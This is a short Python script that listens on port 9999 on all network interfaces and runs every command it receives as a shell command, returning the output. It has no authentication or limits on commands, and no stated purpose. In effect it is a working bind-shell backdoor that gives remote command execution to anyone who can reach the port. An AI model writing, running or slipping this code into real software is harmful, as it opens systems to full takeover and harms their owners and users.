import socket
import subprocess

def handle_client(client_socket):
    while True:
        # Receive command from client
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break

        # Execute command and capture output
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

    client_socket.close()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))  # Bind to all interfaces on port 9999
    server_socket.listen(5)

    print("Server listening on port 9999...")
    while True:
        client_sock, addr = server_socket.accept()
        print(f"Accepted connection from {addr}")
        handle_client(client_sock)

if __name__ == "__main__":
    main()
